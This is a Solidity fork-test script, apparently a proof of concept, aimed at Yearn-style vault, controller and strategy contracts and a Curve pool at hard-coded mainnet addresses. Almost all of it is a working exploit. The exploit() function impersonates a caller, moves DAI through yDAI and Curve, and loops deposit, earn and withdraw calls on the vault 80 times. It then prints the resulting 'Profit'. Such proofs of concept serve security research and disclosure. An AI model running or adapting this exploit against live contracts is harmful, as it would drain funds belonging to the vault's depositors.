pragma solidity ^0.5.0;

import "./script.sol";

interface StrategyLike {
    function forceRebalance(uint) external;
    function getTotalDebtAmount() external returns (uint);
    function getUnderlyingDai() external returns (uint);
    function setStrategist(address) external;
    function strategist() external returns (address);
    function harvest() external;
}

interface ControllerLike {
    function approveStrategy(address,address) external;
    function setStrategy(address,address) external;
    function withdrawAll(address) external;
    function strategies(address) external view returns (bool);
    function approvedStrategies(address, address) external view returns (bool);
}

interface VaultLike {
    function balance() external view returns (uint);
    function balanceOf(address) external view returns (uint);
    function token() external view returns (address);
    function earn() external;
    function deposit(uint) external;
    function setMin(uint) external;
    function withdraw(uint) external;
    function getPricePerFullShare() external view returns (uint);
}

interface CurveLike {
      function get_virtual_price() external view returns (uint);
      function add_liquidity(
        uint256[4] calldata amounts,
        uint256 min_mint_amount
      ) external;
      function remove_liquidity_imbalance(
        uint256[4] calldata amounts,
        uint256 max_burn_amount
      ) external;
      function remove_liquidity(
        uint256 _amount,
        uint256[4] calldata amounts
      ) external;
      function exchange(
        int128 from, int128 to, uint256 _from_amount, uint256 _min_to_amount
      ) external;
}

contract ControllerTest is script {
    using SafeMath for uint;

    StrategyLike private constant STRATEGY = StrategyLike(0x395F93350D5102B6139Abfc84a7D6ee70488797C);
    ControllerLike private constant CONTROLLER = ControllerLike(0x9E65Ad11b299CA0Abefc2799dDB6314Ef2d91080);
    VaultLike private constant VAULT = VaultLike(0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c);
    VaultLike private constant YDAIVAULT = VaultLike(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);
    ERC20Like private constant YDAI = ERC20Like(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);
    ERC20Like private constant DAI = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ERC20Like private constant YFI = ERC20Like(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e);
    ERC20Like private constant YCRV = ERC20Like(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8);
    CurveLike private constant CURVE = CurveLike(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);

	function approve() public {
	    fmt.printf("Total Before=%b\n",abi.encode(CONTROLLER.approvedStrategies(VAULT.token(), address(STRATEGY))));
	    CONTROLLER.approveStrategy(VAULT.token(),address(STRATEGY));
	    fmt.printf("Total Before=%b\n",abi.encode(CONTROLLER.approvedStrategies(VAULT.token(), address(STRATEGY))));
	    VAULT.setMin(10000);
	}

	function run() public {
		//run(this.approve).withCaller(0xFEB4acf3df3cDEA7399794D0869ef76A6EfAff52);
		run(this.exploit).withCaller(0x6daB3bCbFb336b29d06B9C793AEF7eaA57888922);
	}

	function exploit() external {
	    DAI.approve(address(YDAI),DAI.balanceOf(address(this)));
	    YDAIVAULT.deposit(DAI.balanceOf(address(this)));
	    YDAI.approve(address(CURVE),YDAI.balanceOf(address(this)));
	    CURVE.add_liquidity([YDAI.balanceOf(address(this)),0,0,0],0);
	    uint _before = YCRV.balanceOf(address(this));
	    uint _gasbefore = gasleft();
	    fmt.printf("gas=%u\n",abi.encode(_gasbefore));
	    for (uint i = 0; i < 80; i++) {
    	    YCRV.approve(address(VAULT), YCRV.balanceOf(address(this)));
    	    VAULT.deposit(5000000e18);
    	    address(VAULT).call.value(0).gas(300000)(abi.encodeWithSignature("earn()"));
    	    VAULT.deposit(YCRV.balanceOf(address(this)));
    	    VAULT.earn();
    	    VAULT.withdraw(VAULT.balanceOf(address(this)));
	    }
	    uint _after = YCRV.balanceOf(address(this));
	    fmt.printf("Before=%.18u\n",abi.encode(_before));
	    fmt.printf("After=%.18u\n",abi.encode(_after));
	    fmt.printf("Profit=%.18u\n",abi.encode(_after.sub(_before)));
	    uint _gasafter = _gasbefore.sub(gasleft());


	    fmt.printf("gas=%u\n",abi.encode(_gasafter));

	}
}
